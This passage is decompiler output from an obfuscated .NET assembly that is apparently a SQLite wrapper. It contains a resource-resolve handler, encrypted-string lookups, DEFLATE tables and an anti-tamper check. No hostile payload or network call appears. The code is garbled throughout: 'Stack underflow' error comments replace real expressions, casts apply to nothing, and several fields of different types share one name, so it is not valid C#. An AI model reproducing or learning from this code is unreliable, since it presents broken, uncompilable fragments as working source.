		internal static void _0001()
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			try
			{
				_ = AppDomain.CurrentDomain;
				ResolveEventHandler value = _0001;
				((AppDomain)/*Error near IL_001e: Stack underflow*/).ResourceResolve += value;
			}
			catch (Exception)
			{
			}
		}

		private static Assembly _0001(object P_0, ResolveEventArgs P_1)
		{
			//IL_0086: Incompatible stack heights: 0 vs 1
			if ((object)_0017.m__0001 == null)
			{
				string[] obj = _0017.m__0001;
				Monitor.Enter((object)/*Error near IL_0090: Stack underflow*/);
				try
				{
					_0017.m__0001 = Assembly.Load("{ea399890-7465-418d-a2ab-b8053b2e66e9}, PublicKeyToken=3e56350693f7355e");
					if ((object)_0017.m__0001 != null)
					{
						_0017.m__0001 = _0017.m__0001.GetManifestResourceNames();
					}
				}
				finally
				{
					Monitor.Exit(obj);
				}
			}
			string name = P_1.Name;
			for (int i = 0; i < _0017.m__0001.Length; i++)
			{
				if (_0017.m__0001[i] == name)
				{
					if (!_0017._0001())
					{
						return null;
					}
					return _0017.m__0001;
				}
			}
			return null;
		}

		private static bool _0001()
		{
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_0043: Incompatible stack heights: 0 vs 1
			try
			{
				new StackTrace();
				((StackTrace)/*Error near IL_0043: Stack underflow*/).GetFrames();
				StackFrame[] array;
				if (2u != 0)
				{
					array = (StackFrame[])/*Error near IL_0046: Stack underflow*/;
				}
				for (int i = 2; i < array.Length; i++)
				{
					if ((object)array[i].GetMethod()!.Module.Assembly == Assembly.GetExecutingAssembly())
					{
						return true;
					}
				}
				return false;
			}
			catch
			{
				return true;
			}
		}
	}
}
namespace _0080
{
	internal sealed class _0014
	{
		private static readonly string m__0001;

		private static readonly string _0002;

		internal static readonly byte[] _0001;

		internal static readonly Dictionary<int, string> _0001;

		internal static readonly object _0001;

		internal static readonly bool _0001;

		private static readonly int m__0001;

		public static string _0001(int _0002)
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected I4, but got Unknown
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0030: Expected I4, but got Unknown
			//IL_0033: Incompatible stack heights: 0 vs 1
			_003F val = /*Error near IL_0008: Stack underflow*/^ 0x666BEEF;
			if (0 == 0)
			{
				_0002 = (int)val;
			}
			int num = _0014.m__0001;
			_0002 = /*Error near IL_0014: Stack underflow*/- num;
			if (!_0014._0001)
			{
				return global::_0011._0018._0001(_0002);
			}
			return global::_0011._0018._0001(_0002);
		}

		static _0014()
		{
			//IL_00d4: Incompatible stack heights: 0 vs 1
			//IL_00de: Incompatible stack heights: 0 vs 1
			//IL_00e8: Incompatible stack heights: 0 vs 1
			_0014.m__0001 = "1";
			_0002 = "96";
			_0014._0001 = null;
			new object();
			_0014._0001 = (object)/*Error near IL_0024: Stack underflow*/;
			_0014._0001 = false;
			_0014.m__0001 = 0;
			_0010_0003._008B_0006(_0014.m__0001, "1");
			if ((int)/*Error near IL_0046: Stack underflow*/ != 0)
			{
				_0014._0001 = true;
				new Dictionary<int, string>();
				_0014._0001 = (Dictionary<int, string>)/*Error near IL_0056: Stack underflow*/;
			}
			_0014.m__0001 = _0093_0003._0091_0007(_0002);
			Stream stream = _0094_0003._007E_0093_0007(global::_0001._0001(), "{0b8f94ca-66a0-4671-9495-9486ac12958c}");
			try
			{
				int num = global::_0018._0007_0003(global::_0012._007E_0090_0002(stream));
				byte[] array = new byte[num];
				_0082._007E_0006_0004(stream, array, 0, num);
				_0014._0001 = global::_0011._0018._0001(array);
				array = null;
			}
			finally
			{
				if (stream != null)
				{
					global::_0008._007E_0098(stream);
				}
			}
		}
	}
}
namespace _0002
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
	internal sealed class _0018 : Attribute
	{
	}
}
namespace _0012
{
	[AttributeUsage(AttributeTargets.Method)]
	internal sealed class _0012 : Attribute
	{
	}
}
namespace _0007
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Constructor | AttributeTargets.Method)]
	internal sealed class _0019 : Attribute
	{
	}
}
namespace _0017
{
	internal static class _007F
	{
		internal sealed class _0001
		{
			internal static readonly int[] _0001;

			internal static readonly int[] _0002;

			internal static readonly int[] _0003;

			internal static readonly int[] _0004;

			private const int m__0001 = 0;

			private const int _0002 = 1;

			private const int _0003 = 2;

			private const int _0004 = 3;

			private const int _0005 = 4;

			private const int _0006 = 5;

			private const int _0007 = 6;

			private const int _0008 = 7;

			private const int _000E = 8;

			private const int _000F = 9;

			private const int _0010 = 10;

			private const int _0011 = 11;

			private const int _0012 = 12;

			internal int _0013;

			internal int _0014;

			internal int _0015;

			internal int _0016;

			internal int _0017;

			internal bool _0001;

			internal _0002 _0001;

			internal _0003 _0001;

			internal _0005 _0001;

			internal _0004 _0001;

			internal _0004 _0002;

			public _0001(byte[] _0082_0010)
			{
				this._0001 = new _0002();
				this._0001 = new _0003();
				_0013 = 2;
				global::_0011._0018._0001(0, _0082_0010, _0082_0010.Length, this._0001);
			}

			static _0001()
			{
				//IL_0059: Incompatible stack heights: 0 vs 1
				//IL_0060: Incompatible stack heights: 0 vs 1
				//IL_0067: Incompatible stack heights: 0 vs 1
				_ = new int[29]
				{
					3, 4, 5, 6, 7, 8, 9, 10, 11, 13,
					15, 17, 19, 23, 27, 31, 35, 43, 51, 59,
					67, 83, 99, 115, 131, 163, 195, 227, 258
				};
				_007F._0001._0001 = (int[])/*Error near IL_0014: Stack underflow*/;
				_ = new int[29]
				{
					0, 0, 0, 0, 0, 0, 0, 0, 1, 1,
					1, 1, 2, 2, 2, 2, 3, 3, 3, 3,
					4, 4, 4, 4, 5, 5, 5, 5, 0
				};
				_007F._0001._0002 = (int[])/*Error near IL_0028: Stack underflow*/;
				_ = new int[30]
				{
					1, 2, 3, 4, 5, 7, 9, 13, 17, 25,
					33, 49, 65, 97, 129, 193, 257, 385, 513, 769,
					1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577
				};
				_007F._0001._0003 = (int[])/*Error near IL_003c: Stack underflow*/;
				_007F._0001._0004 = new int[30]
				{
					0, 0, 0, 0, 1, 1, 2, 2, 3, 3,
					4, 4, 5, 5, 6, 6, 7, 7, 8, 8,
					9, 9, 10, 10, 11, 11, 12, 12, 13, 13
				};
			}
		}

		internal sealed class _0002
		{
			internal byte[] _0001;

			internal int _0001;

			internal int _0002;

			internal uint _0001;

			internal int _0003;

			public int AvailableBits => ((_0002)/*Error near IL_0007: Stack underflow*/)._0003;

			public int AvailableBytes
			{
				get
				{
					//IL_000e: Unknown result type (might be due to invalid IL or missing references)
					//IL_0018: Unknown result type (might be due to invalid IL or missing references)
					//IL_001a: Expected I4, but got Unknown
					//IL_001b: Incompatible stack heights: 0 vs 1
					//IL_001e: Incompatible stack heights: 0 vs 2
					//IL_0021: Incompatible stack heights: 0 vs 2
					_ = ((_0002)/*Error near IL_0007: Stack underflow*/)._0002;
					int num = ((_0002)/*Error near IL_000e: Stack underflow*/)._0001;
					_ = /*Error near IL_000f: Stack underflow*/- num;
					int num2 = ((_0002)/*Error near IL_0016: Stack underflow*/)._0003;
					return /*Error near IL_0019: Stack underflow*/+ (num2 >> 3);
				}
			}

			public bool IsNeedingInput
			{
				get
				{
					//IL_000e: Invalid comparison between Unknown and I4
					//IL_0012: Incompatible stack heights: 0 vs 1
					//IL_0015: Incompatible stack heights: 0 vs 2
					_ = ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
					int num = ((_0002)/*Error near IL_000e: Stack underflow*/)._0002;
					return (int)/*Error near IL_0010: Stack underflow*/ == num;
				}
			}
		}

		internal sealed class _0003
		{
			private const int _0001 = 32768;

			private const int _0002 = 32767;

			internal byte[] _0001 = new byte[32768];

			internal int _0003;

			internal int _0004;
		}

		internal sealed class _0004
		{
			private const int _0001 = 15;

			internal short[] _0001;

			public static readonly _0004 _0001;

			public static readonly _0004 _0002;

			static _0004()
			{
				//IL_009f: Incompatible stack heights: 0 vs 1
				byte[] array = new byte[288];
				int num = 0;
				while (num < 144)
				{
					int num2 = num++;
					((sbyte[])/*Error near IL_0023: Stack underflow*/)[num2] = 8;
				}
				while (num < 256)
				{
					array[num++] = 9;
				}
				while (num < 280)
				{
					array[num++] = 7;
				}
				while (num < 288)
				{
					array[num++] = 8;
				}
				_0001 = new _0004(array);
				array = new byte[32];
				num = 0;
				while (num < 32)
				{
					array[num++] = 5;
				}
				_0002 = new _0004(array);
			}

			public _0004(byte[] _008F_0010)
			{
				global::_0011._0018._0001(_008F_0010, this);
			}
		}

		internal sealed class _0005
		{
			private const int _0001 = 0;

			private const int _0002 = 1;

			private const int _0003 = 2;

			private const int _0004 = 3;

			private const int m__0005 = 4;

			private const int _0006 = 5;

			internal static readonly int[] _0001;

			internal static readonly int[] _0002;

			internal byte[] _0001;

			internal byte[] _0002;

			internal _0004 _0001;

			internal int _0007;

			internal int _0008;

			internal int _000E;

			internal int _000F;

			internal int _0010;

			internal int _0011;

			internal byte _0001;

			internal int _0012;

			internal static readonly int[] _0003;

			static _0005()
			{
				//IL_0043: Incompatible stack heights: 0 vs 1
				//IL_004a: Incompatible stack heights: 0 vs 1
				_ = new int[3] { 3, 3, 11 };
				_007F._0005._0001 = (int[])/*Error near IL_0013: Stack underflow*/;
				_ = new int[3] { 2, 3, 7 };
				_007F._0005._0002 = (int[])/*Error near IL_0026: Stack underflow*/;
				int[] array = new int[19];
				if (0 == 0)
				{
					RuntimeHelpers.InitializeArray(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
				}
				_0003 = array;
			}
		}

		internal sealed class _0006
		{
			private const int _0001 = 4;

			private const int _0002 = 8;

			private const int _0003 = 16;

			private const int _0004 = 20;

			private const int _0005 = 28;

			private const int m__0006 = 30;

			internal int _0007 = 16;

			internal long _0001;

			internal _000E _0001;

			internal _0008 _0001;

			public long TotalOut => ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;

			public bool IsFinished
			{
				get
				{
					//IL_001e: Incompatible stack heights: 0 vs 1
					//IL_0021: Incompatible stack heights: 0 vs 1
					if (((_0006)/*Error near IL_0007: Stack underflow*/)._0007 == 30)
					{
						return ((_0006)/*Error near IL_0012: Stack underflow*/)._0001._0002 == 0;
					}
					return false;
				}
			}

			public bool IsNeedingInput
			{
				get
				{
					//IL_000b: Incompatible stack heights: 0 vs 1
					//IL_0012: Incompatible stack heights: 0 vs 1
					global::_0011._0018._0001(((_0006)/*Error near IL_0007: Stack underflow*/)._0001);
					return (byte)/*Error near IL_000a: Stack underflow*/ != 0;
				}
			}

			public _0006()
			{
				this._0001 = new _000E();
				_0001 = new _0008(this._0001);
			}
		}

		internal sealed class _0007
		{
			public sealed class _0001
			{
				public short[] _0001;

				public byte[] _0001;

				public int _0001;

				public int _0002;

				internal short[] _0002;

				internal int[] _0001;

				internal int _0003;

				internal _0007 _0001;

				public _0001(_0007 _0002_0011, int _0003_0011, int _0004_0011, int _0005_0011)
				{
					_0001 = _0002_0011;
					this._0001 = _0004_0011;
					_0003 = _0005_0011;
					this._0001 = new short[_0003_0011];
					this._0001 = new int[_0005_0011];
				}
			}

			private const int m__0001 = 16384;

			private const int _0002 = 286;

			private const int _0003 = 30;

			private const int _0004 = 19;

			private const int _0005 = 16;

			private const int _0006 = 17;

			private const int m__0007 = 18;

			private const int _0008 = 256;

			internal static readonly int[] _0001;

			internal static readonly byte[] _0001;

			internal _000E _0001;

			internal _0001 _0001;

			internal _0001 _0002;

			internal _0001 _0003;

			internal short[] _0001;

			internal byte[] _0002;

			internal int _000E;

			internal int _000F;

			internal static readonly short[] _0002;

			internal static readonly byte[] _0003;

			internal static readonly short[] _0003;

			internal static readonly byte[] _0004;

			static _0007()
			{
				//IL_013f: Incompatible stack heights: 0 vs 1
				//IL_0149: Incompatible stack heights: 0 vs 1
				_ = new int[19]
				{
					16, 17, 18, 0, 8, 7, 9, 6, 10, 5,
					11, 4, 12, 3, 13, 2, 14, 1, 15
				};
				_007F._0007._0001 = (int[])/*Error near IL_0017: Stack underflow*/;
				_ = new byte[16]
				{
					0, 8, 4, 12, 2, 10, 6, 14, 1, 9,
					5, 13, 3, 11, 7, 15
				};
				_007F._0007._0001 = (byte[])/*Error near IL_002e: Stack underflow*/;
				_0002 = new short[286];
				_007F._0007._0003 = new byte[286];
				int num = default(int);
				if (0 == 0)
				{
					num = 0;
				}
				while (num < 144)
				{
					_0002[num] = global::_0011._0018._0001(48 + num << 8);
					_007F._0007._0003[num++] = 8;
				}
				while (num < 256)
				{
					_0002[num] = global::_0011._0018._0001(256 + num << 7);
					_007F._0007._0003[num++] = 9;
				}
				while (num < 280)
				{
					_0002[num] = global::_0011._0018._0001(-256 + num << 9);
					_007F._0007._0003[num++] = 7;
				}
				while (num < 286)
				{
					_0002[num] = global::_0011._0018._0001(-88 + num << 8);
					_007F._0007._0003[num++] = 8;
				}
				_0003 = new short[30];
				_0004 = new byte[30];
				for (num = 0; num < 30; num++)
				{
					_0003[num] = global::_0011._0018._0001(num << 11);
					_0004[num] = 5;
				}
			}

			public _0007(_000E _009B_0010)
			{
				this._0001 = _009B_0010;
				this._0001 = new _0001(this, 286, 257, 15);
				this._0002 = new _0001(this, 30, 1, 15);
				this._0003 = new _0001(this, 19, 4, 7);
				this._0001 = new short[16384];
				this._0002 = new byte[16384];
			}
		}

		internal sealed class _0008
		{
			private const int _0001 = 258;

			private const int _0002 = 3;

			private const int _0003 = 32768;

			private const int _0004 = 32767;

			private const int _0005 = 32768;

			private const int _0006 = 32767;

			private const int _0007 = 5;

			private const int m__0008 = 262;

			private const int _000E = 32506;

			private const int _000F = 4096;

			internal int _0010;

			internal short[] _0001;

			internal short[] _0002;

			internal int _0011;

			internal int _0012;

			internal bool _0001;

			internal int _0013;

			internal int _0014;

			internal int _0015;

			internal byte[] _0001;

			internal byte[] _0002;

			internal int _0016;

			internal int _0017;

			internal int _0018;

			internal _000E _0001;

			internal _0007 _0001;

			public _0008(_000E _009B_0010)
			{
				this._0001 = _009B_0010;
				_0001 = new _0007(_009B_0010);
				this._0001 = new byte[65536];
				this._0001 = new short[32768];
				this._0002 = new short[32768];
				_0013 = (_0014 = 1);
			}
		}

		internal sealed class _000E
		{
			protected internal byte[] _0001 = new byte[65536];

			internal int _0001;

			internal int _0002;

			internal uint _0001;

			internal int _0003;

			public int BitCount => ((_000E)/*Error near IL_0007: Stack underflow*/)._0003;

			public bool IsFlushed => ((_000E)/*Error near IL_0007: Stack underflow*/)._0002 == 0;
		}

		internal sealed class _000F : MemoryStream
		{
			public _000F()
			{
			}

			public _000F(byte[] _001E_0010)
				: base(_001E_0010, writable: false)
			{
			}
		}

		public static string _0001;
	}
}
namespace _0001
{
	[CompilerGenerated]
	internal sealed class _0018
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 12)]
		private struct _0001
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 16)]
		internal struct _0002
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 76)]
		private struct _0003
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 116)]
		private struct _0004
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 120)]
		private struct _0005
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 1024)]
		internal struct _0006
		{
		}

		internal static readonly long _0001/* Not supported: data(AD 11 BC BC 99 E7 2D 30) */;

		internal static readonly long _0002/* Not supported: data(B2 18 EC 94 4D 5E 55 CC) */;

		internal static readonly _0006 _0001/* Not supported: data(00 00 00 00 96 30 07 77 2C 61 0E EE BA 51 09 99 19 C4 6D 07 8F F4 6A 70 35 A5 63 E9 A3 95 64 9E 32 88 DB 0E A4 B8 DC 79 1E E9 D5 E0 88 D9 D2 97 2B 4C B6 09 BD 7C B1 7E 07 2D B8 E7 91 1D BF 90 64 10 B7 1D F2 20 B0 6A 48 71 B9 F3 DE 41 BE 84 7D D4 DA 1A EB E4 DD 6D 51 B5 D4 F4 C7 85 D3 83 56 98 6C 13 C0 A8 6B 64 7A F9 62 FD EC C9 65 8A 4F 5C 01 14 D9 6C 06 63 63 3D 0F FA F5 0D 08 8D C8 20 6E 3B 5E 10 69 4C E4 41 60 D5 72 71 67 A2 D1 E4 03 3C 47 D4 04 4B FD 85 0D D2 6B B5 0A A5 FA A8 B5 35 6C 98 B2 42 D6 C9 BB DB 40 F9 BC AC E3 6C D8 32 75 5C DF 45 CF 0D D6 DC 59 3D D1 AB AC 30 D9 26 3A 00 DE 51 80 51 D7 C8 16 61 D0 BF B5 F4 B4 21 23 C4 B3 56 99 95 BA CF 0F A5 BD B8 9E B8 02 28 08 88 05 5F B2 D9 0C C6 24 E9 0B B1 87 7C 6F 2F 11 4C 68 58 AB 1D 61 C1 3D 2D 66 B6 90 41 DC 76 06 71 DB 01 BC 20 D2 98 2A 10 D5 EF 89 85 B1 71 1F B5 B6 06 A5 E4 BF 9F 33 D4 B8 E8 A2 C9 07 78 34 F9 00 0F 8E A8 09 96 18 98 0E E1 BB 0D 6A 7F 2D 3D 6D 08 97 6C 64 91 01 5C 63 E6 F4 51 6B 6B 62 61 6C 1C D8 30 65 85 4E 00 62 F2 ED 95 06 6C 7B A5 01 1B C1 F4 08 82 57 C4 0F F5 C6 D9 B0 65 50 E9 B7 12 EA B8 BE 8B 7C 88 B9 FC DF 1D DD 62 49 2D DA 15 F3 7C D3 8C 65 4C D4 FB 58 61 B2 4D CE 51 B5 3A 74 00 BC A3 E2 30 BB D4 41 A5 DF 4A D7 95 D8 3D 6D C4 D1 A4 FB F4 D6 D3 6A E9 69 43 FC D9 6E 34 46 88 67 AD D0 B8 60 DA 73 2D 04 44 E5 1D 03 33 5F 4C 0A AA C9 7C 0D DD 3C 71 05 50 AA 41 02 27 10 10 0B BE 86 20 0C C9 25 B5 68 57 B3 85 6F 20 09 D4 66 B9 9F E4 61 CE 0E F9 DE 5E 98 C9 D9 29 22 98 D0 B0 B4 A8 D7 C7 17 3D B3 59 81 0D B4 2E 3B 5C BD B7 AD 6C BA C0 20 83 B8 ED B6 B3 BF 9A 0C E2 B6 03 9A D2 B1 74 39 47 D5 EA AF 77 D2 9D 15 26 DB 04 83 16 DC 73 12 0B 63 E3 84 3B 64 94 3E 6A 6D 0D A8 5A 6A 7A 0B CF 0E E4 9D FF 09 93 27 AE 00 0A B1 9E 07 7D 44 93 0F F0 D2 A3 08 87 68 F2 01 1E FE C2 06 69 5D 57 62 F7 CB 67 65 80 71 36 6C 19 E7 06 6B 6E 76 1B D4 FE E0 2B D3 89 5A 7A DA 10 CC 4A DD 67 6F DF B9 F9 F9 EF BE 8E 43 BE B7 17 D5 8E B0 60 E8 A3 D6 D6 7E 93 D1 A1 C4 C2 D8 38 52 F2 DF 4F F1 67 BB D1 67 57 BC A6 DD 06 B5 3F 4B 36 B2 48 DA 2B 0D D8 4C 1B 0A AF F6 4A 03 36 60 7A 04 41 C3 EF 60 DF 55 DF 67 A8 EF 8E 6E 31 79 BE 69 46 8C B3 61 CB 1A 83 66 BC A0 D2 6F 25 36 E2 68 52 95 77 0C CC 03 47 0B BB B9 16 02 22 2F 26 05 55 BE 3B BA C5 28 0B BD B2 92 5A B4 2B 04 6A B3 5C A7 FF D7 C2 31 CF D0 B5 8B 9E D9 2C 1D AE DE 5B B0 C2 64 9B 26 F2 63 EC 9C A3 6A 75 0A 93 6D 02 A9 06 09 9C 3F 36 0E EB 85 67 07 72 13 57 00 05 82 4A BF 95 14 7A B8 E2 AE 2B B1 7B 38 1B B6 0C 9B 8E D2 92 0D BE D5 E5 B7 EF DC 7C 21 DF DB 0B D4 D2 D3 86 42 E2 D4 F1 F8 B3 DD 68 6E 83 DA 1F CD 16 BE 81 5B 26 B9 F6 E1 77 B0 6F 77 47 B7 18 E6 5A 08 88 70 6A 0F FF CA 3B 06 66 5C 0B 01 11 FF 9E 65 8F 69 AE 62 F8 D3 FF 6B 61 45 CF 6C 16 78 E2 0A A0 EE D2 0D D7 54 83 04 4E C2 B3 03 39 61 26 67 A7 F7 16 60 D0 4D 47 69 49 DB 77 6E 3E 4A 6A D1 AE DC 5A D6 D9 66 0B DF 40 F0 3B D8 37 53 AE BC A9 C5 9E BB DE 7F CF B2 47 E9 FF B5 30 1C F2 BD BD 8A C2 BA CA 30 93 B3 53 A6 A3 B4 24 05 36 D0 BA 93 06 D7 CD 29 57 DE 54 BF 67 D9 23 2E 7A 66 B3 B8 4A 61 C4 02 1B 68 5D 94 2B 6F 2A 37 BE 0B B4 A1 8E 0C C3 1B DF 05 5A 8D EF 02 2D) */;

		internal static readonly _0002 _0001/* Not supported: data(02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02) */;

		internal static readonly _0004 _0001/* Not supported: data(03 00 00 00 04 00 00 00 05 00 00 00 06 00 00 00 07 00 00 00 08 00 00 00 09 00 00 00 0A 00 00 00 0B 00 00 00 0D 00 00 00 0F 00 00 00 11 00 00 00 13 00 00 00 17 00 00 00 1B 00 00 00 1F 00 00 00 23 00 00 00 2B 00 00 00 33 00 00 00 3B 00 00 00 43 00 00 00 53 00 00 00 63 00 00 00 73 00 00 00 83 00 00 00 A3 00 00 00 C3 00 00 00 E3 00 00 00 02 01 00 00) */;

		internal static readonly _0001 _0001/* Not supported: data(02 00 00 00 03 00 00 00 07 00 00 00) */;

		internal static readonly _0002 _0002/* Not supported: data(00 08 04 0C 02 0A 06 0E 01 09 05 0D 03 0B 07 0F) */;

		internal static readonly _0005 _0001/* Not supported: data(00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 02 00 00 00 02 00 00 00 03 00 00 00 03 00 00 00 04 00 00 00 04 00 00 00 05 00 00 00 05 00 00 00 06 00 00 00 06 00 00 00 07 00 00 00 07 00 00 00 08 00 00 00 08 00 00 00 09 00 00 00 09 00 00 00 0A 00 00 00 0A 00 00 00 0B 00 00 00 0B 00 00 00 0C 00 00 00 0C 00 00 00 0D 00 00 00 0D 00 00 00) */;

		internal static readonly _0003 _0001/* Not supported: data(10 00 00 00 11 00 00 00 12 00 00 00 00 00 00 00 08 00 00 00 07 00 00 00 09 00 00 00 06 00 00 00 0A 00 00 00 05 00 00 00 0B 00 00 00 04 00 00 00 0C 00 00 00 03 00 00 00 0D 00 00 00 02 00 00 00 0E 00 00 00 01 00 00 00 0F 00 00 00) */;

		internal static readonly _0002 _0003/* Not supported: data(01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01) */;

		internal static readonly _0001 _0002/* Not supported: data(03 00 00 00 03 00 00 00 0B 00 00 00) */;

		internal static readonly _0004 _0002/* Not supported: data(00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 02 00 00 00 02 00 00 00 02 00 00 00 02 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 04 00 00 00 04 00 00 00 04 00 00 00 04 00 00 00 05 00 00 00 05 00 00 00 05 00 00 00 05 00 00 00 00 00 00 00) */;

		internal static readonly _0005 _0002/* Not supported: data(01 00 00 00 02 00 00 00 03 00 00 00 04 00 00 00 05 00 00 00 07 00 00 00 09 00 00 00 0D 00 00 00 11 00 00 00 19 00 00 00 21 00 00 00 31 00 00 00 41 00 00 00 61 00 00 00 81 00 00 00 C1 00 00 00 01 01 00 00 81 01 00 00 01 02 00 00 01 03 00 00 01 04 00 00 01 06 00 00 01 08 00 00 01 0C 00 00 01 10 00 00 01 18 00 00 01 20 00 00 01 30 00 00 01 40 00 00 01 60 00 00) */;
	}
	[AttributeUsage(AttributeTargets.Assembly, Inherited = false)]
	internal sealed class _0019 : Attribute
	{
		internal string _0001;

		public string SourceId => ((_0019)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0019(string _009C_0008)
		{
			_0001 = _009C_0008;
		}

		static _0019()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0008
{
	[AttributeUsage(AttributeTargets.Assembly, Inherited = false)]
	internal sealed class _0011 : Attribute
	{
		internal string _0001;

		public string SourceTimeStamp => ((_0011)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0011(string _009C_0008)
		{
			_0001 = _009C_0008;
		}
	}
}
namespace _0015
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	internal delegate void _0015(IntPtr pUserData, int errorCode, IntPtr pMessage);
}
namespace _0001
{
	internal abstract class _001A
	{
		private const DbType m__0001 = DbType.Object;

		private const string m__0001 = "yyyy-MM-ddTHH:mm:ss.fffffffK";

		internal static readonly string _0002;

		protected internal static readonly DateTime _0001;

		private static readonly double m__0001;

		internal static readonly long _0001;

		internal static readonly long _0002;

		internal static string[] _0001;

		internal static readonly string _0003;

		internal static readonly string _0004;

		internal static Encoding _0001;

		internal SQLiteDateFormats _0001;

		internal DateTimeKind _0001;

		internal string _0005;

		internal static Type[] _0001;

		internal static DbType[] _0001;

		internal static int[] _0001;

		internal static object[] _0001;

		internal static object[] _0002;

		internal static Type[] _0002;

		internal static global::_0014._0017[] _0001;

		internal static object _0001;

		internal static _001D _0001;

		internal _001A(SQLiteDateFormats _0081_0013_0006, DateTimeKind _0019_0087, string _0082_0013_0006)
		{
			this._0001 = _0081_0013_0006;
			this._0001 = _0019_0087;
			_0005 = _0082_0013_0006;
		}

		public virtual string _0001(IntPtr _0002, int _0003)
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_0012: Stack underflow*/, (int)/*Error near IL_0012: Stack underflow*/);
			return (string)/*Error near IL_0007: Stack underflow*/;
		}

		public static string _0001(DateTime _0002, SQLiteDateFormats _0003, DateTimeKind _0004, string _0005)
		{
			//IL_011f: Incompatible stack heights: 0 vs 1
			//IL_012b: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				SQLiteDateFormats sQLiteDateFormats = (SQLiteDateFormats)/*Error near IL_0125: Stack underflow*/;
			}
			switch (/*Error near IL_002e: Stack underflow*/)
			{
			case 0L:
				return _0002.Ticks.ToString(_008F_0003._008B_0007());
			case 2L:
				return global::_0011._0018._0001(_0002).ToString(_008F_0003._008B_0007());
			case 3L:
				return (_0002.Subtract(_001A._0001).Ticks / 10000000).ToString();
			case 4L:
				return _0002.ToString((_0005 != null) ? _0005 : global::_0080._0014._0001(107405736), _008F_0003._008B_0007());
			case 5L:
				return _0002.ToString((_0005 != null) ? _0005 : global::_0080._0014._0001(107405736), _008F_0003._008C_0007());
			default:
				if (_0002.Kind != 0)
				{
					return _0002.ToString(global::_0011._0018._0001(_0005, _0002.Kind), _008F_0003._008B_0007());
				}
				return _0095_0003._0094_0007(_0002, _0004).ToString(global::_0011._0018._0001(_0005, _0004), _008F_0003._008B_0007());
			}
		}

		internal unsafe static string _0001(int _0002)
		{
			//IL_0011: Incompatible stack heights: 0 vs 2
			//IL_0018: Incompatible stack heights: 0 vs 1
			_ = ref _0002;
			_008F_0003._008B_0007();
			((int*)/*Error near IL_0018: Stack underflow*/)->ToString((IFormatProvider?)/*Error near IL_0018: Stack underflow*/);
			return (string)/*Error near IL_000c: Stack underflow*/;
		}

		public static bool _0001(string _0002)
		{
			//IL_0166: Incompatible stack heights: 0 vs 1
			//IL_0170: Incompatible stack heights: 0 vs 1
			//IL_017a: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				global::_0080._0014._0001(107405727);
				new ArgumentNullException((string?)/*Error near IL_017a: Stack underflow*/);
				throw /*Error near IL_0017: Stack underflow*/;
			}
			if (_0096_0003._0095_0007(_0002, 0, bool.TrueString, 0, global::_001A._007E_0016_0003(_0002), StringComparison.OrdinalIgnoreCase) == 0)
			{
				return true;
			}
			if (_0096_0003._0095_0007(_0002, 0, bool.FalseString, 0, global::_001A._007E_0016_0003(_0002), StringComparison.OrdinalIgnoreCase) == 0)
			{
				return false;
			}
			string key;
			if ((key = _0097_0003._007E_0096_0007(_0002, _008F_0003._008B_0007())) != null)
			{
				if (global::_0008._0015._0001 == null)
				{
					global::_0008._0015._0001 = new Dictionary<string, int>(8)
					{
						{
							global::_0080._0014._0001(107405718),
							0
						},
						{
							global::_0080._0014._0001(107405713),
							1
						},
						{
							global::_0080._0014._0001(107405676),
							2
						},
						{
							global::_0080._0014._0001(107405671),
							3
						},
						{
							global::_0080._0014._0001(107405666),
							4
						},
						{
							global::_0080._0014._0001(107405693),
							5
						},
						{
							global::_0080._0014._0001(107405688),
							6
						},
						{
